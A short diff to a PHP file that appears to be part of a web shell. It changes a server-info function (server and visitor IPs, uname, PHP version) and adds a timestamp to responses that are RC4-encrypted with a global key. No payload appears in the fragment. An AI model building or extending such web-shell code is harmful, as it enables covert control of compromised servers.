@@ -52,7 +52,7 @@ if(!function_exists('get_server_info')){
 	function get_server_info(){
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
 		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
-		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
+		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : <span id='server_date'>".@date("d M Y H:i:s",time())."</span>";
 		$server_info['uname'] = php_uname();
 		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
 		$server_info['software'] = $server_software."  PHP ".phpversion();		
@@ -997,7 +997,7 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
+		echo bin2hex(rc4($GLOBALS['cipher_key'], @date("d M Y H:i:s",time()).'|'.$str));
 		die();
 	}
 }
